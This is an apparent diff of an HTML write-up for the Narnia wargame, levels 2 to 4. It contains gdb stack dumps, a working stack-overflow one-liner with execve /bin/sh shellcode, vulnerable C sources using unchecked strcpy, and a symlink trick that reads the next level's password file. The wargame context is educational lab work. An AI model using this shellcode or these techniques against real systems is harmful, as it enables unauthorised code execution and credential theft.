-0xffffd810:	0x672f0000	0x73656d61	0x72616e2f	0x2f61696e
-0xffffd820:	0x6e72616e	0x00326169	0x61616161	0x61616161
-0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
-0xffffd8b0:	0x61616161	0x62626262	0x47445800	0x5345535f
-0xffffd8c0:	0x4e4f4953	0x3d44495f	0x30333035	0x45485300
-0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
-0xffffd8e0:	0x78723d4d	0x322d7476	0x6f633635	0x00726f6c
-0xffffd8f0:	0x5f485353	0x45494c43	0x323d544e	0x322e3231
-0xffffd900:	0x37352e33	0x3136312e	0x35333320	0x34203932
-0xffffd910:	0x53003334	0x545f4853	0x2f3d5954	0x2f766564
-0xffffd920:	0x2f737470	0x4c003033	0x4c415f43	0x00433d4c
-0xffffd930:	0x52455355	0x72616e3d	0x3261696e	0x5f534c00
-0xffffd940:	0x4f4c4f43	0x723d5352	0x3a303d73	0x303d6964
-0xffffd950:	0x34333b31	0x3d6e6c3a	0x333b3130	0x686d3a36
-0xffffd960:	0x3a30303d	0x343d6970	0x33333b30	0x3d6f733a
-</pre></div>
+<span class="go">Program received signal SIGSEGV, Segmentation fault.</span>
+<span class="go">0x62626262 in ?? ()</span>
+<span class="go">(gdb) x/200x $esp</span>
+<span class="go">(gdb) x/200x $esp</span>
+<span class="go">0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea</span>
+<span class="go">0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768</span>
+<span class="go">0xffffd670:	0x0804821c	0xf7fca000	0x00000000	0x00000000</span>
+<span class="go">0xffffd680:	0x00000000	0xed18585e	0xd520bc4e	0x00000000</span>
+<span class="go">0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360</span>
+<span class="go">0xffffd6a0:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000</span>
+<span class="go">0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381</span>
+<span class="go">0xffffd6c0:	0x0804845d	0x00000002	0xffffd6e4	0x080484d0</span>
+<span class="go">0xffffd6d0:	0x08048540	0xf7feb180	0xffffd6dc	0x0000001c</span>
+<span class="go">0xffffd6e0:	0x00000002	0xffffd812	0xffffd828	0x00000000</span>
+<span class="go">0xffffd6f0:	0xffffd8b9	0xffffd8cd	0xffffd8dd	0xffffd8f0</span>
+<span class="go">0xffffd700:	0xffffd913	0xffffd927	0xffffd930	0xffffd93d</span>
+<span class="go">0xffffd710:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3</span>
+<span class="go">0xffffd720:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16</span>
+<span class="go">0xffffd730:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a</span>
+<span class="go">0xffffd740:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000</span>
+<span class="go">0xffffd750:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000</span>
+<span class="go">0xffffd760:	0x00000010	0x1f898b75	0x00000006	0x00001000</span>
+<span class="go">0xffffd770:	0x00000011	0x00000064	0x00000003	0x08048034</span>
+<span class="go">0xffffd780:	0x00000004	0x00000020	0x00000005	0x00000008</span>
+<span class="go">0xffffd790:	0x00000007	0xf7fdc000	0x00000008	0x00000000</span>
+<span class="go">0xffffd7a0:	0x00000009	0x08048360	0x0000000b	0x000036b2</span>
+<span class="go">0xffffd7b0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2</span>
+<span class="go">0xffffd7c0:	0x0000000e	0x000036b2	0x00000017	0x00000000</span>
+<span class="go">0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2</span>
+<span class="go">0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000</span>
+<span class="go">0xffffd7f0:	0x00000000	0x00000000	0xe8000000	0x7c03ba19</span>
+<span class="go">0xffffd800:	0x2bd0895a	0x3866226d	0x69ad5957	0x00363836</span>
+<span class="go">0xffffd810:	0x672f0000	0x73656d61	0x72616e2f	0x2f61696e</span>
+<span class="go">0xffffd820:	0x6e72616e	0x00326169	0x61616161	0x61616161</span>
+<span class="go">0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161</span>
+<span class="go">0xffffd8b0:	0x61616161	0x62626262	0x47445800	0x5345535f</span>
+<span class="go">0xffffd8c0:	0x4e4f4953	0x3d44495f	0x30333035	0x45485300</span>
+<span class="go">0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400</span>
+<span class="go">0xffffd8e0:	0x78723d4d	0x322d7476	0x6f633635	0x00726f6c</span>
+<span class="go">0xffffd8f0:	0x5f485353	0x45494c43	0x323d544e	0x322e3231</span>
+<span class="go">0xffffd900:	0x37352e33	0x3136312e	0x35333320	0x34203932</span>
+<span class="go">0xffffd910:	0x53003334	0x545f4853	0x2f3d5954	0x2f766564</span>
+<span class="go">0xffffd920:	0x2f737470	0x4c003033	0x4c415f43	0x00433d4c</span>
+<span class="go">0xffffd930:	0x52455355	0x72616e3d	0x3261696e	0x5f534c00</span>
+<span class="go">0xffffd940:	0x4f4c4f43	0x723d5352	0x3a303d73	0x303d6964</span>
+<span class="go">0xffffd950:	0x34333b31	0x3d6e6c3a	0x333b3130	0x686d3a36</span>
+<span class="go">0xffffd960:	0x3a30303d	0x343d6970	0x33333b30	0x3d6f733a</span>
+</code></pre></div>
 </p>
 
 <p>We see our payload start at <code>0xffffd828</code> with the last 4 bytes at <code>0xffffd8b4</code></p>
@@ -374,17 +375,17 @@ start with a <a href="https://en.wikipedia.org/wiki/NOP_slide">nop sled</a> to a
 the memory offset introduced by <code>gdb</code>. Then set the <code>EIP</code> to somewhere in the middle
 of the sled</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia2@melinda:/narnia$ ./narnia2 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\x90&#39;*115 + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x60\xd8\xff\xff&#39;&quot;`</span>
-$ whoami
-narnia3
-$ cat /etc/narnia_pass/narnia3
-[password]
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia2@melinda:/narnia$</span> ./narnia2 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;\x90&#39;*115 + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x60\xd8\xff\xff&#39;&quot;</span><span class="sb">`</span>
+<span class="gp">$</span> whoami
+<span class="go">narnia3</span>
+<span class="gp">$</span> cat /etc/narnia_pass/narnia3
+<span class="go">[password]</span>
+</code></pre></div>
 </p>
 
 <h2 id="level-03:dadecd8e397495e170ebcbe00dd8239d">Level 03</h2>
 
-<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
  2
  3
  4
@@ -425,48 +426,48 @@ $ cat /etc/narnia_pass/narnia3
 39
 40
 41
-42</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
-<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
-<span style="color: #75715e">#include &lt;sys/stat.h&gt;</span>
-<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
-<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
-<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
-<span style="color: #75715e">#include &lt;string.h&gt; </span>
+42</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;sys/types.h&gt;</span>
+<span class="cp">#include &lt;sys/stat.h&gt;</span>
+<span class="cp">#include &lt;fcntl.h&gt;</span>
+<span class="cp">#include &lt;unistd.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt; </span>
 
-<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
  
-        <span style="color: #66d9ef">int</span>  <span style="color: #f8f8f2">ifd,</span>  <span style="color: #f8f8f2">ofd;</span>
-        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">ofile[</span><span style="color: #ae81ff">16</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;/dev/null&quot;</span><span style="color: #f8f8f2">;</span>
-        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">ifile[</span><span style="color: #ae81ff">32</span><span style="color: #f8f8f2">];</span>
-        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">32</span><span style="color: #f8f8f2">];</span>
+        <span class="kt">int</span>  <span class="n">ifd</span><span class="p">,</span>  <span class="n">ofd</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  
-        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">){</span>
-                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
-                <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">}</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
  
-        <span style="color: #75715e">/* open files */</span>
-        <span style="color: #f8f8f2">strcpy(ifile,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
-        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">((ofd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(ofile,O_RDWR))</span> <span style="color: #f92672">&lt;</span> <span style="color: #ae81ff">0</span> <span style="color: #f8f8f2">){</span>
-                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;error opening %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">ofile);</span>
-                <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">}</span>
-        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">((ifd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(ifile,</span> <span style="color: #f8f8f2">O_RDONLY))</span> <span style="color: #f92672">&lt;</span> <span style="color: #ae81ff">0</span> <span style="color: #f8f8f2">){</span>
-                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;error opening %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">ifile);</span>
-                <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">}</span>
+        <span class="cm">/* open files */</span>
+        <span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ofile</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">if</span><span class="p">((</span><span class="n">ifd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ifile</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
  
-        <span style="color: #75715e">/* copy from file1 to file2 */</span>
-        <span style="color: #f8f8f2">read(ifd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">write(ofd,buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;copied contents of %s to a safer place... (%s)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,ifile,ofile);</span>
+        <span class="cm">/* copy from file1 to file2 */</span>
+        <span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>
  
-        <span style="color: #75715e">/* close &#39;em */</span>
-        <span style="color: #f8f8f2">close(ifd);</span>
-        <span style="color: #f8f8f2">close(ofd);</span>
+        <span class="cm">/* close &#39;em */</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>
  
-        <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
-<span style="color: #f8f8f2">}</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
 </pre></div>
 </td></tr></table></p>
 
@@ -482,18 +483,18 @@ beyond that will get written to the ofile. So the plan is to to create a symlink
 is that the source path&rsquo;s last 16 characters need to be the same as the target.
 So to do this I created the following directory and symlink:</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia3@melinda:/narnia$ mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
-narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia3@melinda:/narnia$</span> mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
+<span class="gp">narnia3@melinda:/narnia$</span> ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
+</code></pre></div>
 </p>
 
 <p>Now when we pass that to <code>narnia3</code>:</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia3@melinda:/narnia$ ./narnia3 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;/tmp/&#39; + &#39;x&#39;*27 + &#39;/tmp/narn4&#39;&quot;`</span> 
-copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
-narnia3@melinda:/narnia$ cat /tmp/narn4 
-[password]
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia3@melinda:/narnia$</span> ./narnia3 <span class="sb">`</span>python -c <span class="s2">&quot;print &#39;/tmp/&#39; + &#39;x&#39;*27 + &#39;/tmp/narn4&#39;&quot;</span><span class="sb">`</span> 
+<span class="go">copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)</span>
+<span class="gp">narnia3@melinda:/narnia$</span> cat /tmp/narn4 
+<span class="go">[password]</span>
+</code></pre></div>
 </p>
 
 <p>It&rsquo;s a little odd, but I hope you understand what happened. The last part of the
@@ -502,7 +503,7 @@ the double <code>/tmp</code> setup.</p>
 
 <h2 id="level-04:dadecd8e397495e170ebcbe00dd8239d">Level 04</h2>
 
-<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
+<p><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><code class="language-c" data-lang="c"> 1
  2
  3
  4
@@ -520,25 +521,25 @@ the double <code>/tmp</code> setup.</p>
 16
 17
 18
-19</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;string.h&gt;</span>
-<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
-<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
-<span style="color: #75715e">#include &lt;ctype.h&gt;</span>
+19</code></pre></div></td><td class="code"><div class="highlight"><pre><span class="cp">#include &lt;string.h&gt;</span>
+<span class="cp">#include &lt;stdlib.h&gt;</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;ctype.h&gt;</span>
 
-<span style="color: #66d9ef">extern</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">environ;</span>
+<span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
 
-<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
-	<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i;</span>
-	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
 
-	<span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">environ[i]</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
-		<span style="color: #f8f8f2">memset(environ[i],</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strlen(environ[i]));</span>
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+		<span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
 
-	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span><span style="color: #f92672">&gt;</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>
-		<span style="color: #f8f8f2">strcpy(buffer,argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
+		<span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
 
-	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
-<span style="color: #f8f8f2">}</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </pre></div>
 </td></tr></table></p>
 
@@ -548,96 +549,96 @@ This then get zerod out inside <code>main</code> to prevent us from storing any 
 in environment variables. However we might still be able to write <code>EIP</code>, so using the
 trusty pattern generator from before</p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 300
-Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
-Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
-Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
-Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
-</pre></div>
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">local $] ./pattern.py 300</span>
+<span class="go">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7</span>
+<span class="go">Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5</span>
+<span class="go">Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3</span>
+<span class="go">Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
+</code></pre></div>
 </p>
 
-<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia4@melinda:/narnia$ gdb -q ./narnia4 
-Reading symbols from ./narnia4...(no debugging symbols found)...done.
-(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
-Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
-Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
-Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
-Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
-Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
-Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
-Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
+<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">narnia4@melinda:/narnia$</span> gdb -q ./narnia4 
+<span class="go">Reading symbols from ./narnia4...(no debugging symbols found)...done.</span>
+<span class="go">(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5</span>
+<span class="go">Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4</span>
+<span class="go">Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3</span>
+<span class="go">Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span>
+<span class="go">Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5</span>
+<span class="go">Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4</span>
+<span class="go">Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3</span>
